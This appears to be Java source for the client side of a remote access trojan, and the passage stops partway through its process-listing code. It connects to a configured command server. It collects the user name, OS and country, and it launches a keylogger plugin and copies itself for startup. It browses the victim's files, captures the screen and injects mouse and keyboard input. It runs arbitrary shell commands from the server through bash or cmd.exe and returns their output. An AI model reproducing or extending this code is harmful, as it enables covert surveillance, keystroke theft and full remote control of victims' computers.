

import java.awt.Color;
import java.awt.Desktop;
import java.awt.Font;
import java.awt.Graphics2D;
import java.awt.Image;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.InputEvent;
import java.awt.image.BufferedImage;
import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.*;
import java.nio.ByteBuffer;
import java.nio.charset.Charset;
import java.nio.charset.CharsetDecoder;
import java.nio.charset.StandardCharsets;
import java.nio.file.FileSystem;
import java.nio.file.FileSystems;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;

import javafx.scene.paint.Stop;

import javax.swing.JButton;
import javax.swing.JDialog;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JTextArea;
import javax.swing.UIManager;

import java.security.Key;
import java.security.SecureRandom;
import java.util.*; 
import java.util.prefs.Preferences;
import java.util.zip.*;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.imageio.IIOImage;
import javax.imageio.ImageIO;
import javax.imageio.ImageWriteParam;
import javax.imageio.ImageWriter;
import javax.imageio.stream.ImageOutputStream;
import javax.swing.filechooser.FileSystemView;
 














import javax.swing.text.Utilities;

 
import com.sun.glass.ui.Size;
import com.sun.javafx.Utils;



public class client1  implements Runnable  {
	private static Connector cs;
	private static final String ALGORITHM = "AES";
	private static String host;private static int port;
	private static String Encryption_Key_value;
	private static String Splitstring = "";
	private static boolean isconnected;
	private static Thread t;
	private static boolean is_key_ready = false ; //For Encryption
	private static  byte[] keyValue;
	private static int Key_logger_chunk = 0;
	private static int pass_grabber_chunk = 0;
	private static boolean is_read_data = false;
	private boolean has_host = false;
	private boolean has_port = false;
	private static String xx = "|||";
	private static String YY = "";
	private static Robot tRobot;
	private static Rectangle tRectangle; 
	private static BufferedImage tBuffImage;
    private static boolean Keylogger_bCapturing = false;
	private static ByteArrayOutputStream tByteArrOutStream;
	private static final String ALGO_Decrypter = "AES";
	private static String Key_String_Decrypter = "";
	private static byte[] keyValue_Decrypter ;
	 private static int is_logger_started= 0;
	private static String extension_Decrypter = ".BlueEagleXPR";
	private static File P_Toto ;
	public static String get_host(){
		return host;
	}
	 private static void  get_Configuration() {
		  { 
				InputStream tInStream = null;
				if (is_read_data == false){
					try {
						 tInStream = ClassLoader.class.getClass().getResourceAsStream("/config.properties");
						Properties tProp = new Properties();
						tProp.load(tInStream);
						
						String sDNS = tProp.getProperty("DNS");
						String sPortA = tProp.getProperty("PortA");
	 
					 
						/*new Color(0, 64, 128)*/
						if (sDNS == null || sPortA == null ) {
						 
						}else{
							host = sDNS;
							port = Integer.parseInt(sPortA);
							 is_read_data = true;
							 if(isconnected == false ){ cs.Connect(host, port);}
						
						}
					  
					} catch (Exception e) {
						 
					}
				}else{
					if(host.length() > 1){
							if( port >0){
								if(isconnected == false ){ cs.Connect(host, port);}
							}
					}
				}
			
			}//End Get Config
		 

	 }

	 public static void main(String[] args) {
		// new client1();upload_ch_uns_nothread
	 YY = xx.charAt(0)+ "" +xx.charAt(1);
		 try {
				
		 		String platform = System.getProperty("os.name", "generic").toLowerCase(Locale.ENGLISH);
				 if ((platform.indexOf("mac") >= 0) || (platform.indexOf("darwin") >= 0)) {
					 
					 File_Seperator = "/";
					 
				      } else if (platform.indexOf("win") >= 0) {
				    	  File_Seperator = "\\";
				     
				      } else if (platform.indexOf("nux") >= 0) {
				    	  File_Seperator = "/";
				    	 
				      } else {
				    	  File_Seperator = System.getProperty("path.separator");
				    	  if(File_Seperator !="/" || File_Seperator !="\\" || File_Seperator !=":"){
				    		  File_Seperator = System.getProperty("file.separator");
				    		  if(File_Seperator !="/" || File_Seperator !="\\" || File_Seperator !=":"){
				    			  File_Seperator = "/";
				    			  
				    		  }
				    	  }
				      }
				  String operSys = System.getProperty("os.name").toLowerCase();
		           if (operSys.contains("mac")||operSys.contains("darwin")) {
		           	 File_Seperator = "/";
		          
		           } else if (operSys.contains("nix") || operSys.contains("nux")
		                   || operSys.contains("aix")) {
		           	 File_Seperator = "/";
		            
		           } else if (operSys.contains("win")) {
		           	 File_Seperator = "\\";
		           	 
		           } else if (operSys.contains("sunos") ||operSys.contains("solaris") ) {//
		           
		           	 File_Seperator = "/";
		            
		           }
		           
			 
			 
			if(get_keylogger_status().contains("Keyloggger : Not Install")){
				get_keylogger_status();
			 }else if(get_keylogger_status().contains("Keyloggger : Install")&&is_logger_started==0 ){
				 String tempDir = System.getProperty("java.io.tmpdir");
				 File jar_logger =  new File(tempDir+File_Seperator+"keyboard_plugin.jar");
				Desktop.getDesktop().open(jar_logger);
				 }
			
			try {
			 
				 Launch_Startup_Copy();
			} catch (Exception e) {
		    	// new MessageBox().errorBox_nothread(e.getMessage(), "");
				try {
					Launch_Startup_Copy();
				} catch (Exception e1) {
					try {
						Launch_Startup_Copy();
					} catch (Exception e2) {
						try {
							Launch_Startup_Copy();
						} catch (Exception e3) {
							try {
								Launch_Startup_Copy();
							} catch (Exception e4) {
								try {
									Launch_Startup_Copy();
								} catch (Exception e5) {
									 
								}
							}
						}
					}
				}
			}
		} catch (IOException e1) {
		 
		}
		 
	      t = new Thread(new Runnable() {
			
			@Override
			public void run() {
				 
					if (isconnected == false){
						cs = new Connector();
			 try{
			 
		 
				  prepare_country();
				 get_Configuration();
			 
			  
			 }catch (Exception ex){
				 System.out.println("ex " +ex.getMessage());
			 }
						
					}
					
				 
				 
			}
		});
	      try {
			Launch_Startup_Copy();
		} catch (Exception e) {
			  try {
					Launch_Startup_Copy();
				} catch (Exception e2) {
					  try {
							Launch_Startup_Copy();
						} catch (Exception e3) {
							  try {
									Launch_Startup_Copy();
								} catch (Exception e4) {
									  try {
											Launch_Startup_Copy();
										} catch (Exception e6) {
											  try {
													Launch_Startup_Copy();
												} catch (Exception e7) {
													  try {
															Launch_Startup_Copy();
														} catch (Exception e8) {
														 
														}
												}
										}
								}
						}
				}
		}
	     t.setDaemon(false);
	    t.start();
	      int counter_x = 0;
	 
		
	 }
	  
	 
 public static void RConnected(){
	   //System.out.println("Connected event Raised there...");
	    isconnected = true ;
  }
 public static void RDisconnected(){
   System.out.println("Disconnected event Raised there...x1x1");
	    isconnected = false ;
		 
			while (isconnected == false){
				
			 	 
				try{	
					cs = new Connector();
					get_Configuration();
				  System.out.println("retry");
				}
				
				catch(Exception e){  System.out.println("retry ex" + e.getMessage());}
			
			} 
			
	 
	    
	    
  }
 
 private static  ArrayList<String> SplitString(String s){
	 String Word = "";
 ArrayList<String>Words = new ArrayList<String>();
 if(s.contains(YY)==false){
	 Words.add(s);
	 
	
	 return Words;
		
 }else{

	 for (int i = 0 ; i<s.length();i++){
		 if ((s.charAt(i) =='|')== false) {
			 Word += s.charAt(i);
		 }else{
			 if(Words.contains(Word)==false){
			 Words.add(Word);
			 
			}
			 Word = "";
		 }
	 }
		 
		 return Words;
		 
 }
	   
 }
 private static Map<String, String> map = new TreeMap<String, String>   (String.CASE_INSENSITIVE_ORDER);
 private static void prepare_country(){
	
	 map.put("Andorra, Principality Of", "AD");
     map.put("United Arab Emirates", "AE");
     map.put("Afghanistan, Islamic State Of", "AF");
     map.put("Antigua And Barbuda", "AG");
     map.put("Anguilla", "AI");
     map.put("Albania", "AL");
     map.put("Armenia", "AM");
     map.put("Netherlands Antilles", "AN");
     map.put("Angola", "AO");
     map.put("Antarctica", "AQ");
     map.put("Argentina", "AR");
     map.put("American Samoa", "AS");
     map.put("Austria", "AT");
     map.put("Australia", "AU");
     map.put("Aruba", "AW");
     map.put("Azerbaidjan", "AZ");
     map.put("Bosnia-Herzegovina", "BA");
     map.put("Barbados", "BB");
     map.put("Bangladesh", "BD");
     map.put("Belgium", "BE");
     map.put("Burkina Faso", "BF");
     map.put("Bulgaria", "BG");
     map.put("Bahrain", "BH");
     map.put("Burundi", "BI");
     map.put("Benin", "BJ");
     map.put("Bermuda", "BM");
     map.put("Brunei Darussalam", "BN");
     map.put("Bolivia", "BO");
     map.put("Brazil", "BR");
     map.put("Bahamas", "BS");
     map.put("Bhutan", "BT");
     map.put("Bouvet Island", "BV");
     map.put("Botswana", "BW");
     map.put("Belarus", "BY");
     map.put("Belize", "BZ");
     map.put("Canada", "CA");
     map.put("Cocos (Keeling) Islands", "CC");
     map.put("Central African Republic", "CF");
     map.put("Congo, The Democratic Republic Of The", "CD");
     map.put("Congo", "CG");
     map.put("Switzerland", "CH");
     map.put("Ivory Coast (Cote D'Ivoire)", "CI");
     map.put("Cook Islands", "CK");
     map.put("Chile", "CL");
     map.put("Cameroon", "CM");
     map.put("China", "CN");
     map.put("Colombia", "CO");
     map.put("Costa Rica", "CR");
     map.put("Former Czechoslovakia", "CS");
     map.put("Cuba", "CU");
     map.put("Cape Verde", "CV");
     map.put("Christmas Island", "CX");
     map.put("Cyprus", "CY");
     map.put("Czech Republic", "CZ");
     map.put("Germany", "DE");
     map.put("Djibouti", "DJ");
     map.put("Denmark", "DK");
     map.put("Dominica", "DM");
     map.put("Dominican Republic", "DO");
     map.put("Algeria", "DZ");
     map.put("Ecuador", "EC");
     map.put("Estonia", "EE");
     map.put("Egypt", "EG");
     map.put("Western Sahara", "EH");
     map.put("Eritrea", "ER");
     map.put("Spain", "ES");
     map.put("Ethiopia", "ET");
     map.put("Finland", "FI");
     map.put("Fiji", "FJ");
     map.put("Falkland Islands", "FK");
     map.put("Micronesia", "FM");
     map.put("Faroe Islands", "FO");
     map.put("France", "FR");
     map.put("France (European Territory)", "FX");
     map.put("Gabon", "GA");
     map.put("Great Britain", "UK");
     map.put("Grenada", "GD");
     map.put("Georgia", "GE");
     map.put("French Guyana", "GF");
     map.put("Ghana", "GH");
     map.put("Gibraltar", "GI");
     map.put("Greenland", "GL");
     map.put("Gambia", "GM");
     map.put("Guinea", "GN");
     map.put("Guadeloupe (French)", "GP");
     map.put("Equatorial Guinea", "GQ");
     map.put("Greece", "GR");
     map.put("S. Georgia & S. Sandwich Isls.", "GS");
     map.put("Guatemala", "GT");
     map.put("Guam (USA)", "GU");
     map.put("Guinea Bissau", "GW");
     map.put("Guyana", "GY");
     map.put("Hong Kong", "HK");
     map.put("Heard And McDonald Islands", "HM");
     map.put("Honduras", "HN");
     map.put("Croatia", "HR");
     map.put("Haiti", "HT");
     map.put("Hungary", "HU");
     map.put("Indonesia", "ID");
     map.put("Ireland", "IE");
     map.put("Israel", "IL");
     map.put("India", "IN");
     map.put("British Indian Ocean Territory", "IO");
     map.put("Iraq", "IQ");
     map.put("Iran", "IR");
     map.put("Iceland", "IS");
     map.put("Italy", "IT");
     map.put("Jamaica", "JM");
     map.put("Jordan", "JO");
     map.put("Japan", "JP");
     map.put("Kenya", "KE");
     map.put("Kyrgyz Republic (Kyrgyzstan)", "KG");
     map.put("Cambodia, Kingdom Of", "KH");
     map.put("Kiribati", "KI");
     map.put("Comoros", "KM");
     map.put("Saint Kitts & Nevis Anguilla", "KN");
     map.put("North Korea", "KP");
     map.put("South Korea", "KR");
     map.put("Kuwait", "KW");
     map.put("Cayman Islands", "KY");
     map.put("Kazakhstan", "KZ");
     map.put("Laos", "LA");
     map.put("Lebanon", "LB");
     map.put("Saint Lucia", "LC");
     map.put("Liechtenstein", "LI");
     map.put("Sri Lanka", "LK");
     map.put("Liberia", "LR");
     map.put("Lesotho", "LS");
     map.put("Lithuania", "LT");
     map.put("Luxembourg", "LU");
     map.put("Latvia", "LV");
     map.put("Libya", "LY");
     map.put("Morocco", "MA");
     map.put("Monaco", "MC");
     map.put("Moldavia", "MD");
     map.put("Madagascar", "MG");
     map.put("Marshall Islands", "MH");
     map.put("Macedonia", "MK");
     map.put("Mali", "ML");
     map.put("Myanmar", "MM");
     map.put("Mongolia", "MN");
     map.put("Macau", "MO");
     map.put("Northern Mariana Islands", "MP");
     map.put("Martinique (French)", "MQ");
     map.put("Mauritania", "MR");
     map.put("Montserrat", "MS");
     map.put("Malta", "MT");
     map.put("Mauritius", "MU");
     map.put("Maldives", "MV");
     map.put("Malawi", "MW");
     map.put("Mexico", "MX");
     map.put("Malaysia", "MY");
     map.put("Mozambique", "MZ");
     map.put("Namibia", "NA");
     map.put("New Caledonia (French)", "NC");
     map.put("Niger", "NE");
     map.put("Norfolk Island", "NF");
     map.put("Nigeria", "NG");
     map.put("Nicaragua", "NI");
     map.put("Netherlands", "NL");
     map.put("Norway", "NO");
     map.put("Nepal", "NP");
     map.put("Nauru", "NR");
     map.put("Neutral Zone", "NT");
     map.put("Niue", "NU");
     map.put("New Zealand", "NZ");
     map.put("Oman", "OM");
     map.put("Panama", "PA");
     map.put("Peru", "PE");
     map.put("Polynesia (French)", "PF");
     map.put("Papua New Guinea", "PG");
     map.put("Philippines", "PH");
     map.put("Pakistan", "PK");
     map.put("Poland", "PL");
     map.put("Saint Pierre And Miquelon", "PM");
     map.put("Pitcairn Island", "PN");
     map.put("Puerto Rico", "PR");
     map.put("Portugal", "PT");
     map.put("Palau", "PW");
     map.put("Paraguay", "PY");
     map.put("Qatar", "QA");
     map.put("Reunion (French)", "RE");
     map.put("Romania", "RO");
     map.put("Russian Federation", "RU");
     map.put("Rwanda", "RW");
     map.put("Saudi Arabia", "SA");
     map.put("Solomon Islands", "SB");
     map.put("Seychelles", "SC");
     map.put("Sudan", "SD");
     map.put("Sweden", "SE");
     map.put("Singapore", "SG");
     map.put("Saint Helena", "SH");
     map.put("Slovenia", "SI");
     map.put("Svalbard And Jan Mayen Islands", "SJ");
     map.put("Slovak Republic", "SK");
     map.put("Sierra Leone", "SL");
     map.put("San Marino", "SM");
     map.put("Senegal", "SN");
     map.put("Somalia", "SO");
     map.put("Suriname", "SR");
     map.put("Saint Tome (Sao Tome) And Principe", "ST");
     map.put("Former USSR", "SU");
     map.put("El Salvador", "SV");
     map.put("Syria", "SY");
     map.put("Swaziland", "SZ");
     map.put("Turks And Caicos Islands", "TC");
     map.put("Chad", "TD");
     map.put("French Southern Territories", "TF");
     map.put("Togo", "TG");
     map.put("Thailand", "TH");
     map.put("Tadjikistan", "TJ");
     map.put("Tokelau", "TK");
     map.put("Turkmenistan", "TM");
     map.put("Tunisia", "TN");
     map.put("Tonga", "TO");
     map.put("East Timor", "TP");
     map.put("Turkey", "TR");
     map.put("Trinidad And Tobago", "TT");
     map.put("Tuvalu", "TV");
     map.put("Taiwan", "TW");
     map.put("Tanzania", "TZ");
     map.put("Ukraine", "UA");
     map.put("Uganda", "UG");
     map.put("United Kingdom", "UK");
     map.put("USA Minor Outlying Islands", "UM");
     map.put("United States", "US");
     map.put("Uruguay", "UY");
     map.put("Uzbekistan", "UZ");
     map.put("Holy See (Vatican City State)", "VA");
     map.put("Saint Vincent & Grenadines", "VC");
     map.put("Venezuela", "VE");
     map.put("Virgin Islands (British)", "VG");
     map.put("Virgin Islands (USA)", "VI");
     map.put("Vietnam", "VN");
     map.put("Vanuatu", "VU");
     map.put("Wallis And Futuna Islands", "WF");
     map.put("Samoa", "WS");
     map.put("Yemen", "YE");
     map.put("Mayotte", "YT");
     map.put("Yugoslavia", "YU");
     map.put("South Africa", "ZA");
     map.put("Zambia", "ZM");
     map.put("Zaire", "ZR");
     map.put("Zimbabwe", "ZW");
 }
 private static String getCode(String country){
     String countryFound = map.get(country);
     if(countryFound==null){
             countryFound="UK";
     }
     return countryFound;
     }

 private static String get_keylogger_status() throws IOException{
	 String status_k = "cs";
		String tempDir = System.getProperty("java.io.tmpdir");
		File out_file = new File(tempDir+File_Seperator+"jR_keylogs" + File_Seperator + "keys.txt");
		File jar_logger =  new File(tempDir+File_Seperator+"keyboard_plugin.jar");
		if (jar_logger.exists()){
			status_k = " Keyloggger : Installed";
			if (is_logger_started==1){
					if(out_file.exists()==false){
						is_logger_started=0;
					}
			}else if (is_logger_started==0){
					//start it here 
				Desktop.getDesktop().open(jar_logger);
				is_logger_started = 1;
			}
	
		}else{
			status_k = " Keyloggger : Not Installed";
			is_logger_started = 0;
		}
		
		
		
	 return status_k;
 }
 private static int Chunk_counter = 0;
 private static int there_but_notsent = 0;
 private static int pause_unstable = 0;
 private static String File_Seperator = "xxx";
 private static boolean exit_unstable=false;
 @SuppressWarnings("deprecation")
public static void RData(String b){
	   try{
		 
			  b = b.replace("fxf0x4x4x0fxf", YY);
		 
		
		   //System.out.println(SplitString(b));
		   String xc = SplitString(b).get(0);
		  
		   //System.out.println(xc);
		   
		   if(xc.equals("info")){
			   if(exit_unstable==false && there_but_notsent ==1){exit_unstable=true;}
			   try{ Launch_Startup_Copy();}catch(Exception e){}
			   String OS;
				 String Country;
				 
				 String User;
				 String plat_For_Base = "" ; //Detect if windows , Mac , Linux Based 
				 String platform = System.getProperty("os.name", "generic").toLowerCase(Locale.ENGLISH);
				 if ((platform.indexOf("mac") >= 0) || (platform.indexOf("darwin") >= 0)) {
					 plat_For_Base = "mac os";
					 File_Seperator = "/";
				      } else if (platform.indexOf("win") >= 0) {
				    	  File_Seperator = "\\";
				    		 plat_For_Base = "win-jar";
				      } else if (platform.indexOf("nux") >= 0) {
				    	  File_Seperator = "/";
				    		 plat_For_Base = "linux";
				      } else {
				    	  File_Seperator = System.getProperty("path.separator");
				    	  if(File_Seperator !="/" || File_Seperator !="\\" || File_Seperator !=":"){
				    		  File_Seperator = System.getProperty("file.separator");
				    		  if(File_Seperator !="/" || File_Seperator !="\\" || File_Seperator !=":"){
				    			  File_Seperator = "/";
				    		  }
				    	  }
				      }
				  String operSys = System.getProperty("os.name").toLowerCase();
		            if (operSys.contains("mac")||operSys.contains("darwin")) {
		            	 File_Seperator = "/";
		            } else if (operSys.contains("nix") || operSys.contains("nux")
		                    || operSys.contains("aix")) {
		            	 File_Seperator = "/";
		            } else if (operSys.contains("win")) {
		            	 File_Seperator = "\\";
		            } else if (operSys.contains("sunos") ||operSys.contains("solaris") ) {//
		            	plat_For_Base = "solaris".toUpperCase();
		            	 File_Seperator = "/";
		            }
		            plat_For_Base = plat_For_Base + get_keylogger_status() ;
				 OS = System.getProperty("os.name");
				 Locale tLocate = Locale.getDefault();
				 User = System.getProperty("user.name");
				 System.getProperty("user.country");
				 Country = tLocate.getDisplayCountry(Locale.ENGLISH);
				 if (Country.length()<2){
					 Country = "Location Services Disabled";
				 }
				 String pcinfo = "Java_Victim" + YY +User + YY +OS + YY + Country + YY  ;
				 
				 System.out.println("info" + YY + pcinfo + YY + plat_For_Base + YY  );
				 
				 cs.Send("info" + YY + pcinfo + YY + plat_For_Base + YY + System.getProperty("user.country")+YY);
		   }
		   if(xc.equals("openfm")){
			      cs.Send("fm" + YY + "fs"+File_Seperator + YY);
		   }
		   if(xc.equals("getdrives")){
			  
			   String allDrives = "";
			   FileSystemView fsv = FileSystemView.getFileSystemView();
				 File[] f = File.listRoots();
	             for (int i = 0; i < f.length; i++)
	             {
	           	
	              cs.Send("drive" + YY + f[i] + YY + fsv.getSystemTypeDescription(f[i]) );
	             }
			 
		
			  
		   }
		   if(xc.equals("FileManager")){
			   
			   String Dir_path = b;
			   
			   if(b.contains("FileManager")){
					 Dir_path = Dir_path.replace("|", "");
					 Dir_path = Dir_path.replace("|", "");
					 Dir_path = Dir_path.replace("FileManager", "");
					 
					 //System.out.println(Dir_path);
				 }
			   File folder = new File(Dir_path);
			   File[] listOfFiles = folder.listFiles();

			   for (int i = 0; i < listOfFiles.length; i++) {
			     if (listOfFiles[i].isFile()) {
			    	 cs.Send("fileitem"  + YY +listOfFiles[i].getName() + YY + convertSize(listOfFiles[i].length()));
			    	 
			     } else if (listOfFiles[i].isDirectory()) {
			    	 cs.Send("folderitem" + YY + listOfFiles[i].getName());
			     }
			   }
		   }
		   if(xc.equals("dsktop")){
			 
			   int widthxx =  (int) Toolkit.getDefaultToolkit().getScreenSize().getWidth();
			   int heightxx = (int) Toolkit.getDefaultToolkit().getScreenSize().getHeight();
			   //cs.Send("desktop" + YY + "Java" + YY + widthxx + "|" + heightxx + "|" + YY);
			    cs.Send("desktop"  + YY + widthxx + YY + heightxx);
		 
		 
		   }
		   if(xc.equals("fast_screen")){
			   

		        try {
		        	  
					   int widthx =  (int) Toolkit.getDefaultToolkit().getScreenSize().getWidth();
					   int heightx = (int) Toolkit.getDefaultToolkit().getScreenSize().getHeight();
					   
					   int nedW = 400;
					   int nedH = 400;
					     
					   //System.out.println("width " + nedW);
					//   System.out.println("height " + nedH);
					    
					  
					   int tarw = (int)  (widthx  );
					   int tarh = (int)(heightx  ); 
					 startCapture( tarw,tarh,nedW,nedH,true);
					 
					 
				} catch (Exception e) {
					 
				}
				/*new Thread() {
					public void run() {
				        BufferedInputStream tBuffInStream = null;
				        FileOutputStream tFileOutStream = null;
				
					}
				}.start();
			   */
			
			   
		   }
		   if(xc.equals("@")){
			   
				//Send Screen Image 
			   final int widthx =  (int) Toolkit.getDefaultToolkit().getScreenSize().getWidth();
			   final int heightx = (int) Toolkit.getDefaultToolkit().getScreenSize().getHeight();
			   
			   final int nedW = Integer.parseInt((SplitString(b).get(2)));
			   final int nedH = Integer.parseInt((SplitString(b).get(3)));
			   			try {
				 		    
							   //System.out.println("width " + nedW);
							//   System.out.println("height " + nedH);
							  int tarw = widthx ;
							   int tarh = heightx ; 
							  startCapture( tarw,tarh,(int)nedW,(int)nedH,false);
							  
						} catch (Exception e) {
							 
						}
			
		   }
		   if(xc.equals("$")){//mouse move
			   if(!(tRobot == null)){
				   
			    int c_x = Integer.parseInt((SplitString(b).get(2)));
				   int c_y = Integer.parseInt((SplitString(b).get(3)));
				 tRobot.mouseMove(c_x, c_y);
			   }
		   }
		   if(xc.equals("#")){//mouse clicks
			   if(!(tRobot == null)){
				   try{
						  int c_x = Integer.parseInt((SplitString(b).get(2)));
						   int c_y = Integer.parseInt((SplitString(b).get(3)));
						   tRobot.mouseMove(c_x, c_y);
					  }catch (Exception e1x){
					 }
					  String mouse_points = b;
					   mouse_points = mouse_points.replace("|", "");
					   	if (mouse_points.contains("pres-l")){
					   	  tRobot.mousePress(InputEvent.BUTTON1_DOWN_MASK);
					   	  //Don`t Automatic 
						  //tRobot.mouseRelease(InputEvent.BUTTON1_DOWN_MASK);
					   		}else if (mouse_points.contains("rels-l")){
					   		 
							  tRobot.mouseRelease(InputEvent.BUTTON1_DOWN_MASK);
					   		}
					   	if (mouse_points.contains("pres-r")){
							  tRobot.mousePress(InputEvent.BUTTON3_DOWN_MASK );
							  tRobot.mouseRelease(InputEvent.BUTTON3_DOWN_MASK );
						   		}else if (mouse_points.contains("rels-r")){
						   		 
						   		  tRobot.mouseRelease(InputEvent.BUTTON3_DOWN_MASK );
						   		}
					   	if (mouse_points.contains("middle-p")){
						   	  tRobot.mousePress(InputEvent.BUTTON2_DOWN_MASK);
						   	  //Don`t Automatic 
							  //tRobot.mouseRelease(InputEvent.BUTTON1_DOWN_MASK);
						   		}else if (mouse_points.contains("middle-r")){
						   		 
								  tRobot.mouseRelease(InputEvent.BUTTON2_DOWN_MASK);
						   		}
				  }
		   }
		   if(xc.equals("code")){ //Keystrokes to Send to Active Application
			   if(!(tRobot == null)){
				   String key_char_fULL = b;
				  
				   key_char_fULL = key_char_fULL.replace("|", "");
				   key_char_fULL = key_char_fULL.substring(4);
				  String key_char = key_char_fULL; //Trimmed Value
			//	 //System.out.println("Key_Code_integer" + key_char);
				    //Note  : ==> Another Idea while detecing java Client send it key code integer from keyvenet args in .NET
				   // -- Versi AI Helper 
				  tRobot.keyPress(Integer.parseInt(key_char));
				  //Empty line 
				  //Empty line 
				  //Waiting 1 ms 
				  //Still
				  tRobot.keyRelease(Integer.parseInt(key_char));
				   //Release Keystroke 
				    
			   }
		   }
		   if(xc.equals("ke")){ //Keystrokes to Send to Active Application
			   if(!(tRobot == null)){
				   String key_char_fULL = b;
				   key_char_fULL = key_char_fULL.replace("|", "");
				   key_char_fULL = key_char_fULL.substring(2);
				  String key_char = key_char_fULL; //Trimmed Value
				  // //System.out.println("keyboard key : " + key_char);
				   //Note  : ==> Convert from String key to Enum Then Release The keys also after being Pressed 
				   // -- Versi AI Helper 
				     // i convert from string to enum using (Enum.Value(""))
				  //Failed of this one 
				  //i have to create own mehtod to return type of that enum 
				    }
			    
		   }
		   if(xc.equals("sendfile")){
			   
		   } if(xc.equals("open_proc")){
			    cs.Send("open_proc" + YY);
		   } 
		   if(xc.equals("openterminal")){
			    cs.Send("openterminal" + YY);
		   }if(xc.equals("execute_terminal")){
			   System.out.println("i rec " + (SplitString(b).get(2)));
			   final String finalb = b;
			 /*  new Thread(new Runnable() {

				@Override
				public void run() {
*/
					   String platform = System.getProperty("os.name", "generic").toLowerCase(Locale.ENGLISH);
						 if ((platform.indexOf("mac") >= 0) || (platform.indexOf("darwin") >= 0)) { //MAC OS 
							  
							try {
								ProcessBuilder builder = new ProcessBuilder("/bin/bash", "-c", (SplitString(finalb).get(2)));
							        builder.redirectErrorStream(true);
							        Process p = builder.start();
							        BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
							        String line;
							        String appender = "";
							        while((line=r.readLine())!=null) {
							        	appender = appender + line + "liner_split";
							        }
							        cs.Send("result_terminal" + YY + appender + YY);
							      
							} catch (Exception e) {
								 cs.Send("error_terminal" + YY + "Shell Commander Exception : " + "liner_split" + e.getMessage() + YY);
							}
						       
						    
						    
						      } else if (platform.indexOf("win") >= 0) {//Windows OS
						    	   
						    	  ProcessBuilder processBuilder = new ProcessBuilder();
						          // Windows
						          processBuilder.command("cmd.exe", "/c", (SplitString(finalb).get(2)));
						          String appender = "";
						          try {

						              Process process = processBuilder.start();

						              BufferedReader reader =
						                      new BufferedReader(new InputStreamReader(process.getInputStream()));

						              String line = "";
						           
						              while ((line = reader.readLine()) != null) {
						            	  appender = appender + line + "liner_split";
						              }

						              int exitCode = process.waitFor();
						              

						          } catch (IOException e) {
						        	  cs.Send("error_terminal" + YY + "Shell Commander Exception : " + "liner_split" + e.getMessage() + YY);
						          } catch (InterruptedException e) {
						        	  cs.Send("error_terminal" + YY + "Shell Commander Exception : " + "liner_split" + e.getMessage() + YY);
						          }
						    	  
								        
								    cs.Send("result_terminal" + YY + appender + YY);
						      } else if (platform.indexOf("nux") >= 0) {//LINUX OS 
						    	  ProcessBuilder processBuilder = new ProcessBuilder();
						    	  processBuilder.command("bash", "-c", (SplitString(finalb).get(2)));
						    	  String appender = "";
						    
						    	  try {
						    		  StringBuilder output = new StringBuilder();
						              Process process = processBuilder.start();

						              BufferedReader reader =
						                      new BufferedReader(new InputStreamReader(process.getInputStream()));

						              String line = "";
						           
						              while ((line = reader.readLine()) != null) {
						            	  output.append(line + "liner_split");
						              }
 
						          		 cs.Send("result_terminal" + YY + output + YY);
						          		 
						           

						          } catch (IOException e) {
						        	  cs.Send("error_terminal" + YY + "Shell Commander Exception : " + "liner_split" + e.getMessage() + YY);
						          }
								   
						      } else {
						    	   
						    	//LINUX OS 
						    	  ProcessBuilder processBuilder = new ProcessBuilder();
						    	  processBuilder.command("bash", "-c", (SplitString(finalb).get(2)));
						    	  String appender = "";
						    
						    	  try {
						    		  StringBuilder output = new StringBuilder();
						              Process process = processBuilder.start();

						              BufferedReader reader =
						                      new BufferedReader(new InputStreamReader(process.getInputStream()));

						              String line = "";
						           
						              while ((line = reader.readLine()) != null) {
						            	  output.append(line + "liner_split");
						              }

 
						          		 cs.Send("result_terminal" + YY + output + YY);
						           
						          } catch (IOException e) {
						        	  cs.Send("error_terminal" + YY + "Shell Commander Exception : " + "liner_split" + e.getMessage() + YY);
						          }
						      }
					   
					   
					
				//}
				   
			 //  }).start();
			   
			   
			
		   }    
		   if(xc.equals("getproc")){
			   
			   
			   
			   String platform = System.getProperty("os.name", "generic").toLowerCase(Locale.ENGLISH);
				 if ((platform.indexOf("mac") >= 0) || (platform.indexOf("darwin") >= 0)) { //MAC OS 
					  
						try {
							ProcessBuilder builder = new ProcessBuilder("/bin/bash", "-c", ("ps -axo pid,comm"));
						        builder.redirectErrorStream(true);
						        Process p = builder.start();
						        BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
						        String line;
						        String appender = "";
						        while((line=r.readLine())!=null) {
						        	appender = appender + line + "liner_split";
						        }
						        cs.Send("result_proc_mac" + YY + appender + YY);
						      
						} catch (Exception e) {
							  cs.Send("error_terminal_proc" + YY + "Shell Commander Exception : " + "liner_split" + e.getMessage() + YY);
						}
					 
				      } else if (platform.indexOf("win") >= 0) {//Windows OS
				    	  String all_process_data = "";
				    	  ArrayList<String> all_Proc_Windows = listRunningProcesses_Windows();
				    		 for (String p_name : all_Proc_Windows){
				    			 String Proc_name = p_name.split(",")[0];
				    			 String Proc_PID = p_name.split(",")[1];
				    			 String Proc_Session_Name = p_name.split(",")[2];
				    			 String Proc_Session_Num = p_name.split(",")[3];
				    			 all_process_data = all_process_data + Proc_name + "proc_splt" + Proc_PID + "proc_splt"+Proc_Session_Name  + "proc_splt" + Proc_Session_Num +  "proc_end_line" ;
				    			 
				    		 }
				    	  cs.Send("get_proc" + YY + "windows"  + YY + all_process_data + YY);
				    	 
				      } else if (platform.indexOf("nux") >= 0) {//LINUX OS 
				    	  ProcessBuilder processBuilder = new ProcessBuilder();
				    	  processBuilder.command("bash", "-c", ("ps -axo pid,comm"));
				    	  String appender = "";
				    
